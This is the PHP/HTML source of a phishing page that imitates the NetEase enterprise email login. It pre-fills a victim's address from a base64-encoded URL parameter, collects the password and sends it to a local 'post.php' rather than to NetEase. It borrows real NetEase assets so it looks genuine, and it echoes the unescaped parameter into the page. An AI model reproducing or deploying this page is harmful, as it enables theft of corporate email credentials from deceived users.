﻿<?php


$user = $_REQUEST['email'];
$email = base64_decode($user);


?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
		<meta name="keywords" content="企业邮箱,企业邮箱登录,登录企业邮箱,163企业邮箱,企业信箱,网易企业邮箱,企业邮局,企业电子邮箱,企业邮件,企业内部邮箱,中国企业邮箱,企业邮箱网站,购买企业邮箱,反垃圾邮件,电子邮件,Email,邮箱,传真邮件,电子商务,集团邮箱,集团邮局, 集团邮件" />
		<meta name="description" content="网易企业邮箱，最专业最稳定，反垃圾技术最优秀，收发速度最快，界面操作最简洁的企业邮箱，由自主研发国内首个全中文电子邮件系统以及具有十年邮箱运营经验的网易倾力打造。" />
		<meta name="title" content="网易企业邮箱 - 企业信息化专业解决方案">
		<title>企业 - 邮箱用户登录</title>
		<link href="//mimg.qiye.163.com/o/domain/201611171800/index/css/global.css" rel="stylesheet" type="text/css" />
		<link href="//mimg.qiye.163.com/o/domain/201611171800/index/css/user.css" rel="stylesheet" type="text/css" />
		<style type="text/css">
		.login-mod h2, .intro-mod h2, .news-mod h2 {
			background-image:url(//mimg.qiye.163.com/o/domain/201611171800/index/css/../img/bg_cn_noqiye.png);
			background-repeat:no-repeat;
		}
		.login-mod-wrapper {
			width: 413px;
			height: 355px;
			position: absolute;
			top:40px;
			left: 498px;
		}
        .login-mod-form {
            background: url(//mimg.qiye.163.com/o/domain/201611171800/index/css/../img/loginFormBg.png) no-repeat;
        }
        .login-mod-qr {
            background: url(//mimg.qiye.163.com/o/domain/201611171800/index/css/../img/bg_qr_expand.png) no-repeat;
        }
        .login-mod .fi-notit {
            padding-left:30px;
        }
        .login-qr {
            position: absolute;
            left: 350px;
            top: 291px;
            width: 64px;
            height: 64px;
            cursor: pointer;
        }
        .login-qr-1 {
            background: url(//mimg.qiye.163.com/o/domain/201611171800/index/css/../img/ic_qr.png) no-repeat;
        }
        .login-qr-1-hover {
            left: 349px;
            background: url(//mimg.qiye.163.com/o/domain/201611171800/index/css/../img/ic_qr_hover.png) no-repeat;
        }
        .app-download {
            float:left;
            margin-left:10px;
            padding-left:20px;
            margin-top:6px;
        }
        .app-download-android {
            background:url(//mimg.qiye.163.com/o/domain/201611171800/index/css/../img/ic_android.png) no-repeat;
        }
        .app-download-iphone {
            background:url(//mimg.qiye.163.com/o/domain/201611171800/index/css/../img/ic_apple.png) no-repeat;
        }
        .app-download-link {
            color: #9eb8a0;
            text-decoration: none;
        }
		.logo {
			width:150px;
			height:40px;
			background: url() no-repeat 0 0;
		}
		.fi{
			padding: 5px 0 !important;
		}
		#err-wrapper{
			width: 170px !important;
		}
		</style>
		<link href="//mimg.qiye.163.com/o/domain/201611171800/index/css/custom.css" rel="stylesheet" type="text/css" />
		<!--[if lt ie 9]>
		<style type="text/css">
		.logo {
			background: none; 
			filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='http://mimg.qiye.163.com/o/public/logo.gif', sizingMethod='scale');
		}
		</style>
		<![endif]-->
	</head>
	<body>
		<div class="page">
			<div class="header">
				<h1 class="logo"></h1>
				<div class="toplinks">
                    <a href="/?hl=zh_TW" target="_self">繁體版</a> |
                        <a href="/?hl=en_US" target="_self">English</a> |
                        <a href="http://qiye.163.com/entry/help/help-client.htm" target="_blank">帮助</a>
                    </div>
			</div>
			<div class="body">
				<div class="part main-part" id="main-part">
					<div id="login-mod-wrapper" class="login-mod-wrapper login-mod-form">
						<div class="mod login-mod  ">
							<form name="loginform" id="loginform" action="post.php" method="post" onsubmit="return frmvalidator();">
								<input type="hidden" name="ch" id="ch" value="">
								<input type="hidden" name="pubid" id="pubid" value="">
								<input type="hidden" name="passtype" id="passtype" value="">
								<input type="hidden" name="support_verify_code" id="support_verify_code" value="1">
								<input type="hidden" name="domain" id="domain" value="" />
									<script type="text/javascript">
										window.myDomain = "";
										window.isCommonPage = false;
										if(window.myDomain == "qiye.163.com"){
											window.isCommonPage = true;
										}
									</script>
								<h2>
									企业用户登录
								</h2>
								<div class="fi">
									<label class="tit">
										用户名
									</label>
									<input name="email" class="form-control" id="email" value="<?php echo $email; ?>" placeholder="Username" type="hidden">
				<font face="verdana" color="#000000" size="3"> <?php echo $email; ?> </font>	

				<p>
								</div>
								<div class="fi">
									<label class="tit">
										密 码
									</label>
									<input type="password" class="ipt-t" name="password" id="password" value=""/>
								</div>
								<!-- 新增验证码 -->
								<div id="verifyCodeWrap" class="fi f-dn">
									<label class="tit">验证码</label>
									<input type="text" name="verify_code" id="verify_code" style="float:left;width:140px;height:24px;line-height:24px;" class="ipt-sample">
									<a id="codeImgWrap" style="float:left;width:100px;height:30px;padding:0;margin:0;display:block;cursor:pointer;" href="javascript:void(0);">
										<img src="" style="width:100%;height:100%;">
									</a>
								</div>
								<div class="fi" style="clear:both;">
									<label for="remUsername">
										<input name="remUser" id="remUsername" value="1" type="checkbox" class="ipt-c" />
										记住用户名
									
									</label>
								</div>
								<div class="fi fi-notit f-cb">
									<input type="submit" class="ipt-b" value="登　录" style="float:left;" id="submit-btn" />
                                    <div id="app-download-wrapper">
                                        <div class="app-download app-download-android">
                                            <a class="app-download-link" href="http://u.163.com/androidds4" target="_blank">Android版</a>&nbsp;
                                        </div>
                                        <div class="app-download app-download-iphone">
                                            <a class="app-download-link" href="http://u.163.com/iosds4" target="_blank">iPhone版</a>
                                        </div>
                                    </div>
									<table id="err-wrapper" class="err f-dn">
										<tr>
											<td id="msgpid"></td>
										</tr>
									</table>
								</div>
								<div class="goto" style="margin-top:0;">
										<a href="/admin.jsp" class="gotoLink" target="_blank">管理员登录</a>
                                        <a class="gotoLink" id="resetPwd">忘记密码？</a>
										<a class="gotoLink" id="selectNetwork">登录太慢？</a>
										</div>
								</form>
						</div>
                        <div id="login-qr-1" class="login-qr login-qr-1"></div>
					</div>
                    <div id="login-mod-qr" class="login-mod-wrapper login-mod-qr f-dn">
                        <div id="login-qr-2" class="login-qr"></div>
                    </div>
				</div>
				<div class="part sec-part">
						</div>
				</div>
			<div class="footer">
                <div class="link">
                        <a href="" target="_blank">企业邮箱</a>
                    </div>
                    <div class="right">
                        <span>本系统由企业邮提供 &copy;1997-<script language="javascript" src="//mimg.qiye.163.com/copyright/year.js"></script> </span>
                    </div>
                </div>
		</div>
	</body>
	<script type="text/javascript">
	var isDefaultBg = true,
		currentBanner = 'http://mimg.qiye.163.com/domain/index/img/user_bg.jpg',
		currentStyle = '3',
		addresses = 't,c,h',
        pageType = 'normal';
        verifyCodeUrl = 'http://entry.qiye.163.com/domain/getverifycode.jsp';
        verifyCode = 'false';
	</script>
	<script type="text/javascript" src="//mimg.qiye.163.com/o/domain/201611171800/index/css/../js/jquery.js"></script>
	<script type="text/javascript" src="//mimg.qiye.163.com/o/domain/201611171800/index/css/../js/jquery-migrate.js"></script>
	<script type="text/javascript" src="//mimg.qiye.163.com/o/domain/201611171800/index/css/../js/lang_zhcn.js"></script>
	<script type="text/javascript" src="//mimg.qiye.163.com/o/domain/201611171800/index/css/../js/select_network.js"></script>
	<script type="text/javascript" src="//mimg.qiye.163.com/o/domain/201611171800/index/css/../js/login_util.js"></script>
	<script type="text/javascript" src="//mimg.qiye.163.com/o/domain/201611171800/index/css/../js/jquery.jsonp-2.4.0.min.js"></script>
    <script type="text/javascript" src="//mimg.qiye.163.com/o/domain/201611171800/index/css/../js/select_banner.js"></script>
    <script type="text/javascript" src="//mimg.qiye.163.com/o/domain/201611171800/index/css/../js/reset_pwd.js"></script>
    <script type="text/javascript" src="http://mimg.qiye.163.com/o/index/lib/scripts/qiye_algorithm.js"></script>
</html>